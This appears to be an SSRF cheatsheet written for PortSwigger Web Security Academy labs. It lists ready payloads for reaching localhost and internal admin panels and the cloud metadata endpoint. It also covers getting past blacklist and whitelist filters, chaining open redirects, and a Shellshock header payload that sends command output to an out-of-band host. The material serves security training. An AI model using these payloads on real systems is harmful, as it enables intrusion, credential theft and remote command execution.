# 🌐 Server-Side Request Forgery (SSRF) Cheatsheet

Complete methodology, bypass techniques, and exploitation vectors for SSRF labs tested in PortSwigger Web Security Academy.

---

## 📌 Attack Vectors & Methodology

* Target Parameters: `?stockApi=`, `?url=`, `?path=`, `?feed=`, `?dest=`, `?api_url=`
* Common Internal Endpoints:
  - Localhost Admin: `http://localhost/admin` or `http://127.0.0.1/admin`
  - Internal IP Ranges: `http://192.168.0.x/admin` or `http://10.0.0.x/admin`
  - Cloud Metadata (AWS/GCP): `http://169.254.169.254/latest/meta-data/`

---

## 🛠️ Detailed Breakdown & Payloads

* **Basic SSRF against the local server:**
  - Change target parameter to request local server endpoints directly:
  - `stockApi=http://localhost/admin`

* **Basic SSRF against another back-end system:**
  - Scan internal IP range using Burp Intruder (e.g., 192.168.0.1 to 192.168.0.254) on port 8080 or 80:
  - `stockApi=http://192.168.0.X:8080/admin`

* **SSRF with blacklist-based input filter:**
  - Bypass localhost/admin filters using alternative IP representations or double URL encoding:
  - IP Representations: `http://127.1/admin` or `http://2130706433/admin`
  - Case / URL Encoding: `http://127.1/aDmin` or `http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`

* **SSRF with whitelist-based input filter:**
  - Bypass strict URL parser parsing logic using credentials/fragment symbols (`@`, `#`):
  - `stockApi=http://username@stock.welcometotheshop.net:80@localhost/admin`
  - `stockApi=http://localhost#@stock.welcometotheshop.net`

* **SSRF with filter bypass via open redirection vulnerability:**
  - Leverage an open redirect on the target site to force the backend server to follow the redirect to internal endpoints:
  - `stockApi=/product/nextProduct?currentAccountId=1&path=http://192.168.0.12:8080/admin`

* **Blind SSRF with out-of-band detection:**
  - Inject Burp Collaborator domain into headers (e.g., `Referer`, `User-Agent`) or API parameters to detect out-of-band requests:
  - `Referer: http://BURP-COLLABORATOR-SUBDOMAIN`

* **Blind SSRF with Shellshock exploitation:**
  - Inject Shellshock command execution payload into the `User-Agent` header while triggering an internal network scan via SSRF parameter:
  - `User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
  - Target internal host range via `Referer` or SSRF endpoint to execute commands on internal servers.
